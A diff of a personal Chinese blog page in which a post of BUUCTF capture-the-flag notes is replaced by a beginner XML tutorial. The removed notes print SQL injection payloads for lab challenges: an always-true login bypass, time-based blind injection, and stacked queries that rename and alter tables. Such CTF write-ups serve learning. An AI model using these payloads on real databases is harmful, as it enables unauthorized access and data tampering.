@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF做题笔记, Chenluo">
+    <meta name="keywords" content="xml学习, Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF做题笔记 | Chenluo</title>
+    <title>xml学习 | Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF做题笔记</h1>
+                    <h1 class="description center-align post-title">xml学习</h1>
                 </div>
             </div>
         </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-07
+                    2021-05-09
                 </div>
                 
 
@@ -457,7 +457,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    557
+                    1.2k
                 </div>
                 
 
@@ -477,116 +477,134 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BUUCTF做题笔记"><a href="#BUUCTF做题笔记" class="headerlink" title="BUUCTF做题笔记"></a>BUUCTF做题笔记</h1><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><ol>
-<li><p>根据提示可以知道是sql注入</p>
-</li>
-<li><p>经过多次尝试,联合，盲注都不行</p>
-<p>测试的同时知道过滤了union and or “ updatexml…….</p>
-</li>
-<li><p>尝试一下，堆叠查询</p>
-</li>
+                <h1 id="XML解析"><a href="#XML解析" class="headerlink" title="XML解析"></a>XML解析</h1><h2 id="1-应该掌握的知识"><a href="#1-应该掌握的知识" class="headerlink" title="1. 应该掌握的知识:"></a>1. 应该掌握的知识:</h2><ol>
+<li>html</li>
+<li>javascript</li>
 </ol>
-<ul>
-<li><p>构造语句</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">show</span> <span class="token keyword">databases</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq8ycx0hpqj30uq0amt9m.jpg" alt="image-20210506195433547"></p>
-<p>有结果显示;</p>
-<p>查表</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq8ye1k7wvj30vt07iq3t.jpg" alt="image-20210506195539392"></p>
-<p>查列</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> flag <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq8ygt8tk7j30ve04vjrz.jpg" alt="image-20210506195819676"></p>
-<p>估计是把flag过滤了。。。</p>
-<p>之后在网上找到说是后台代码</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> $_GET<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span> <span class="token operator">||</span> flag <span class="token keyword">from</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>如果是这样</p>
+<h2 id="2-简介"><a href="#2-简介" class="headerlink" title="2. 简介:"></a>2. 简介:</h2><h3 id="2-1-什么是xml"><a href="#2-1-什么是xml" class="headerlink" title="2.1 什么是xml:"></a>2.1 什么是xml:</h3><ul>
+<li><p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）。</p>
 </li>
-<li><p>flag已经有了，那么查询</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq8z6df6x1j30xe08t3zg.jpg" alt="image-20210506202253105"></p>
-<p>因为查*会查到所有的内容，查1的时候会自动增加1列，这一列的内容为1,这里的1是为了中和||flag,这样返回的数字就是1，查询的内容也会直接显示</p>
+<li><p>XML 被设计用来<strong>传输和存储数据。</strong></p>
+</li>
+<li><p>XML 的设计宗旨是<strong>传输数据</strong>，而不是显示数据。</p>
+</li>
+<li><p>XML 标签没有被预定义。您需要<strong>自行定义标签</strong>。</p>
+</li>
+<li><p>XML 被设计为具有自我描述性。</p>
+</li>
+<li><p>XML 是 W3C 的推荐标准。</p>
 </li>
 </ul>
-<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><ol>
-<li><p>看见表单sql注入，之间抓包，在bp里面解决</p>
-</li>
-<li><p>尝试万能密码登陆</p>
-<p>2.1 猜测闭合方式</p>
-</li>
-</ol>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq9023itckj30ur0cwq49.jpg" alt="image-20210506205322482"></p>
-<p>​    2.2 单引号闭合方式 </p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>admin<span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-2-xml和html的差异"><a href="#2-2-xml和html的差异" class="headerlink" title="2.2 xml和html的差异:"></a>2.2 xml和html的差异:</h3><ul>
+<li>HTML 旨在显示信息，而 XML 旨在传输信息。</li>
+</ul>
+<h3 id="2-3-XML-不会做任何事情"><a href="#2-3-XML-不会做任何事情" class="headerlink" title="2.3 XML 不会做任何事情"></a>2.3 XML 不会做任何事情</h3><p>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ol start="3">
-<li>进去后直接显示了flag</li>
-</ol>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq900srut0j30yh0fkwhs.jpg" alt="image-20210506205207855"></p>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><ol>
-<li>测试</li>
-</ol>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq905dewb4j30qq046q38.jpg" alt="image-20210506205631727"></p>
-<ol start="2">
-<li><p>直接告诉了过滤了什么</p>
-</li>
-<li><p>查看闭合的方式(单引号字符型)</p>
-</li>
-</ol>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq908geqpaj30y60gfwga.jpg" alt="image-20210506205929107"></p>
-<ol start="2">
-<li>之后就利用延时注吧</li>
-</ol>
-<p>爆库</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if(substr(database(),1,1)='</span>s'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>具有自我描述性(自定义标签)。它包含了发送者和接受者的信息，同时拥有标题以及消息主体。</p>
+<p>但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p>
+<h2 id="3-XML的用途"><a href="#3-XML的用途" class="headerlink" title="3. XML的用途"></a>3. XML的用途</h2><h3 id="3-1-xml把数据从html中分离"><a href="#3-1-xml把数据从html中分离" class="headerlink" title="3.1 xml把数据从html中分离"></a>3.1 xml把数据从html中分离</h3><p>数据存储在xml文件中，通过js代码读取该xml的文件，更新网页数据</p>
+<h3 id="3-2-xml简化数据共享"><a href="#3-2-xml简化数据共享" class="headerlink" title="3.2 xml简化数据共享"></a>3.2 xml简化数据共享</h3><p>xml的数据以文本的格式存储，独立于软件和硬件，可以有效的避免计算机系统和数据不兼容问题</p>
+<h3 id="3-3-xml简化数据传输"><a href="#3-3-xml简化数据传输" class="headerlink" title="3.3 xml简化数据传输"></a>3.3 xml简化数据传输</h3><p>由于互联网上不同的系统，数据不兼容，交换数据同样不兼容问题，xml读取数据以纯文本的形式，避免了不兼容的问题</p>
+<p>。。。。之后看<a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-usage.html">菜鸟教程</a></p>
+<h2 id="XML的树结构"><a href="#XML的树结构" class="headerlink" title="XML的树结构"></a>XML的树结构</h2><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>利用bp爆破，由于采用的延时注入，线程放慢到1</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq90subki0j30xx05u0u0.jpg" alt="image-20210506211904567"></p>
-<p>爆破结果</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq90qx2tfaj30li06ht9d.jpg" alt="image-20210506211714207"></p>
-<p>所以数据库应该是:supersqli</p>
-<p>爆表</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="要点"><a href="#要点" class="headerlink" title="要点:"></a>要点:</h3><h4 id="1-xml代码的第一行必须是对xml的声明"><a href="#1-xml代码的第一行必须是对xml的声明" class="headerlink" title="1. xml代码的第一行必须是对xml的声明"></a>1. xml代码的第一行必须是对xml的声明</h4><h4 id="2-之后的第一个标签就是树的根，称为根元素"><a href="#2-之后的第一个标签就是树的根，称为根元素" class="headerlink" title="2. 之后的第一个标签就是树的根，称为根元素"></a>2. 之后的第一个标签就是树的根，称为根元素</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>没法弄了。。。过滤了select。。。</p>
-<p>试一下，堆叠注入吧</p>
-<p>查表</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token punctuation">;</span> <span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="3-接下来就是子元素"><a href="#3-接下来就是子元素" class="headerlink" title="3. 接下来就是子元素"></a>3. 接下来就是子元素</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq91amdmfxj310s07gt98.jpg" alt="image-20210506213609555"></p>
-<p>查列</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">'; show columns from `1919810931114514`; #
-0'</span><span class="token punctuation">;</span> <span class="token keyword">desc</span> words<span class="token punctuation">;</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="4-菜鸟教程"><a href="#4-菜鸟教程" class="headerlink" title="4. 菜鸟教程"></a>4. <a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-tree.html">菜鸟教程</a></h4><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><h3 id="1-首先进行声明"><a href="#1-首先进行声明" class="headerlink" title="1. 首先进行声明"></a>1. 首先进行声明</h3><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>反单引号（`）是数据库、表、索引、列和别名用的引用符</strong></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq91g355yoj30kj08v3z2.jpg" alt="image-20210506214124589"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq91lrhjptj30k60gqdgz.jpg" alt="image-20210506214652466"></p>
-<p>看到这，就想起之前输入的1和2.。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq91z66z5kj30do079wer.jpg" alt="image-20210506215945840"></p>
-<p>这里就想到提交查询有可能查的是words，但是我们需要查询flag。。。</p>
-<p>构造payload</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">to</span> words2<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-xml文档必须有根元素"><a href="#2-xml文档必须有根元素" class="headerlink" title="2. xml文档必须有根元素"></a>2. xml文档必须有根元素</h3><h3 id="3-所有的xml元素必须严格关闭"><a href="#3-所有的xml元素必须严格关闭" class="headerlink" title="3. 所有的xml元素必须严格关闭"></a>3. 所有的xml元素必须严格关闭</h3><h3 id="4-xml标签对大小写敏感"><a href="#4-xml标签对大小写敏感" class="headerlink" title="4. xml标签对大小写敏感"></a>4. xml标签对大小写敏感</h3><h3 id="5-xml的属性值必须加引号"><a href="#5-xml的属性值必须加引号" class="headerlink" title="5. xml的属性值必须加引号"></a>5. xml的属性值必须加引号</h3><h3 id="6-xml的实体引用-类似于html的实体编码"><a href="#6-xml的实体引用-类似于html的实体编码" class="headerlink" title="6. xml的实体引用(类似于html的实体编码)"></a>6. xml的实体引用(类似于html的实体编码)</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqb66kmld1j30bk05raaa.jpg" alt="image-20210508175624094"></p>
+<ul>
+<li>这些字符都应该被前面的编码代替</li>
+</ul>
+<h3 id="7-注释方法"><a href="#7-注释方法" class="headerlink" title="7. 注释方法"></a>7. 注释方法</h3><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- --></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq923pmd78j30i7042dg0.jpg" alt="image-20210506220407090"></p>
-<p>间接证明了，前面数据库求对了</p>
-<p>重启一下环境</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">to</span> words2<span class="token punctuation">;</span> <span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">to</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token punctuation">;</span> <span class="token keyword">alter</span> <span class="token keyword">table</span> words change flag id <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment">#   //两次改名，之前已经知道我们输入的1和2分别查询words表中的id和data字段，所以，除了改表名还要修改flag字段名为id大小100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="8-Xml会保留空格"><a href="#8-Xml会保留空格" class="headerlink" title="8. Xml会保留空格"></a>8. Xml会保留空格</h3><ul>
+<li>html会对空格进行缩减</li>
+</ul>
+<h3 id="9-XML以LF存储换行"><a href="#9-XML以LF存储换行" class="headerlink" title="9. XML以LF存储换行"></a>9. XML以LF存储换行</h3><ul>
+<li>XML 以 LF 存储换行。</li>
+</ul>
+<h2 id="XML的元素-注意不是属性"><a href="#XML的元素-注意不是属性" class="headerlink" title="XML的元素(注意不是属性)"></a>XML的元素(注意不是属性)</h2><p>根标签下的字标签，包含文本属性</p>
+<h3 id="1-命名规则："><a href="#1-命名规则：" class="headerlink" title="1. 命名规则："></a>1. 命名规则：</h3><p><strong>以字母开头，不包含空格</strong></p>
+<p>最佳命名习惯： <a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-elements.html">菜鸟教程</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqb6fl3nfvj30lv01adg0.jpg" alt="image-20210508180504152"></p>
+<h3 id="2-xml的元素是可以扩展的"><a href="#2-xml的元素是可以扩展的" class="headerlink" title="2. xml的元素是可以扩展的"></a>2. xml的元素是可以扩展的</h3><p><strong>XML 的优势之一，就是可以在不中断应用程序的情况下进行扩展。</strong></p>
+<p>随时添加标签。。</p>
+<h2 id="xml的属性"><a href="#xml的属性" class="headerlink" title="xml的属性"></a>xml的属性</h2><p>xml的属性提供有关元素的额外的信息</p>
+<h3 id="1-xml属性必须加引号"><a href="#1-xml属性必须加引号" class="headerlink" title="1. xml属性必须加引号"></a>1. xml属性必须加引号</h3><h3 id="2-xml中尽量少使用一些属性，有些属性可以被元素代替，那么推荐使用元素"><a href="#2-xml中尽量少使用一些属性，有些属性可以被元素代替，那么推荐使用元素" class="headerlink" title="2. xml中尽量少使用一些属性，有些属性可以被元素代替，那么推荐使用元素"></a>2. xml中尽量少使用一些属性，有些属性可以被元素代替，那么推荐使用元素</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqbu1y3mrfj30n504xwey.jpg" alt="image-20210509074220000"></p>
+<h3 id="3-有关属性的一些问题"><a href="#3-有关属性的一些问题" class="headerlink" title="3. 有关属性的一些问题:"></a>3. 有关属性的一些问题:</h3><ul>
+<li>属性不能包含多个值（元素可以）</li>
+<li>属性不能包含树结构（元素可以）</li>
+<li>属性不容易扩展（为未来的变化）</li>
+</ul>
+<h3 id="4-针对元数据的xml属性"><a href="#4-针对元数据的xml属性" class="headerlink" title="4. 针对元数据的xml属性"></a>4. 针对元数据的xml属性</h3><p>相同的元素可以用id属性值来标识，id只是标识作用</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>messages</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>501<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>502<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Re: Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>I will not<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>messages</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq9oykqssfj30i208xq3g.jpg" alt="image-20210507111456489"></p>
-<p>查找flag</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="XML验证-DTD"><a href="#XML验证-DTD" class="headerlink" title="XML验证(DTD)"></a>XML验证(DTD)</h2><h3 id="1-DTD的作用是定义xml文档结构"><a href="#1-DTD的作用是定义xml文档结构" class="headerlink" title="1. DTD的作用是定义xml文档结构"></a>1. DTD的作用是定义xml文档结构</h3><ul>
+<li>在xml文件中应该声明对外部dtd文件的引用</li>
+</ul>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"Note.dtd"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq9ow0hvkmj30j804ydg7.jpg" alt="image-20210507111228601"></p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>直接查看源代码</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq9phk12x0j30qs05yaas.jpg" alt="image-20210507113310895"></p>
-<p>访问一下</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq9pi5lmivj30ph0dwab2.jpg" alt="image-20210507113345227"></p>
-<p>得到flag。。。</p>
+<h3 id="2-DTD大体结构"><a href="#2-DTD大体结构" class="headerlink" title="2. DTD大体结构"></a>2. DTD大体结构</h3><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE note
+[
+&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="XML-javascript"><a href="#XML-javascript" class="headerlink" title="XML javascript"></a>XML javascript</h2><h3 id="1-XMLHttpRequest对象"><a href="#1-XMLHttpRequest对象" class="headerlink" title="1. XMLHttpRequest对象"></a>1. XMLHttpRequest对象</h3><p><strong>xmlhttprequest对象用于在后台与服务器之间交换数据</strong></p>
+<h4 id="作用"><a href="#作用" class="headerlink" title="作用:"></a>作用:</h4><ul>
+<li>在不重新加载页面的情况下更新网页</li>
+<li>在页面已加载后从服务器请求数据</li>
+<li>在页面已加载后从服务器接收数据</li>
